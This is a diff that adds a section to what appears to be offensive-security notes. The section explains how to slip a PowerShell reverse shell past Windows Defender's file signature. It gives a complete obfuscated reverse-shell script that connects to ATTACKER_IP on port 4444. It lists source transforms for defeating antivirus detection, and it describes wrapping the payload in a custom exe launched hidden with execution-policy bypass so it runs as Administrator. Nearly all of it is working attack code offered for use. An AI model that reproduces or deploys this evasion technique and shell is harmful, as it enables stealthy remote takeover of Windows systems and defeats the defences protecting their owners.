@@ -301,3 +301,32 @@ powershell -enc <base64_string>
 ```
 
 Upgrade from web shell to reverse shell once foothold established — web shells are fragile (no TTY, timeout risk, log noise).
+
+### Evading Defender's on-disk signature (the classic TCPClient shell)
+
+The plain `New-Object System.Net.Sockets.TCPClient(...)` + `iex $data` one-liner above is
+signatured by Windows Defender: dropped to disk (or fetched) it is deleted/killed before it
+connects, so the listener stays silent. Three source transforms defeat the signature match while
+keeping identical behaviour (no AMSI patch needed - the reconstructed script is not what the
+signature looks for):
+
+- **Split the flagged type name** so the literal `TCPClient` never appears on disk:
+  `$ns="System.Net.Sockets."+"TCP"+"Client"; $cl=New-Object $ns($ip,$port)`.
+- **Drop `iex`/`Invoke-Expression`** (both signatured) for `&([scriptblock]::Create($cmd))`.
+- **Rename every variable** to short/random names; avoid the well-known Nishang identifiers.
+
+```powershell
+$ns="System.Net.Sockets."+"TCP"+"Client";$cl=New-Object $ns("ATTACKER_IP",4444)
+$st=$cl.GetStream();$wr=New-Object System.IO.StreamWriter($st);$wr.AutoFlush=$true
+$bf=New-Object System.Byte[] 2048;$en=New-Object System.Text.ASCIIEncoding;$wr.Write("PS "+(pwd).Path+"> ")
+while(($n=$st.Read($bf,0,2048)) -gt 0){$cm=$en.GetString($bf,0,$n);$rs=try{ &([scriptblock]::Create($cm)) 2>&1|Out-String }catch{ $_|Out-String };$wr.Write($rs+"PS "+(pwd).Path+"> ")};$cl.Close()
+```
+
+To run this from a dropped payload as a privileged process (e.g. a writable binary a scheduled task
+runs as Administrator - see [[windows-privilege-escalation]]), wrap it in a freshly compiled custom
+exe (`x86_64-w64-mingw32-gcc`) that calls `powershell -nop -w hidden -ep bypass -e <UTF-16LE-base64>`;
+a brand-new binary has no AV signature, and the encoded command survives because the obfuscated
+script above already clears the on-execute scan. See also [[windows-amsi-bypass]] for the
+memory-patch route when AMSI (not the file signature) is the blocker.
+
+<!-- promoted-slug: ps-revshell-defender-evasion -->
